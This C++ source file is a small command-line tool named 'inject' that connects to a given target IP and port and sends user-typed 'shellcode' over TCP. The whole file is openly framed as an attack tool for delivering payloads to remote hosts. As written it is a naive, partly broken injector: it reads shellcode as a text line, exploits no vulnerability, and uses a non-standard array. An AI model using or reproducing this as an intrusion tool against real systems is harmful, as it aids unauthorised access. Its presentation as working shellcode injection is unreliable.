#include <iostream>
#include <cstring>
#include <cstdlib>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

using namespace std;

int main(int argc, char* argv[]) {
    if (argc != 2) {
        cerr << "Usage: ./inject <target_ip>\n";
        return 1;
    }

    char* target_ip = argv[1];

    int port;
    cout << "Enter the port number: ";
    cin >> port;

    cin.ignore(); // consume the newline character

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        cerr << "Error creating socket\n";
        return 1;
    }

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(target_ip);
    target_addr.sin_port = htons(port);

    if (connect(sockfd, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
        cerr << "Error connecting to target\n";
        close(sockfd); // close socket on error
        return 1;
    }

    cout << "Enter the shellcode to inject: ";
    string shellcode;
    getline(cin, shellcode);

    char buffer[shellcode.length() + 1];
    strncpy(buffer, shellcode.c_str(), sizeof(buffer));

    ssize_t bytes_written = write(sockfd, buffer, shellcode.length());
    if (bytes_written < 0) {
        cerr << "Error writing to socket\n";
        close(sockfd); // close socket on error
        return 1;
    } else if (bytes_written != shellcode.length()) {
        cerr << "Incomplete write to socket\n";
        close(sockfd); // close socket on error
        return 1;
    }

    close(sockfd);

    return 0;
}
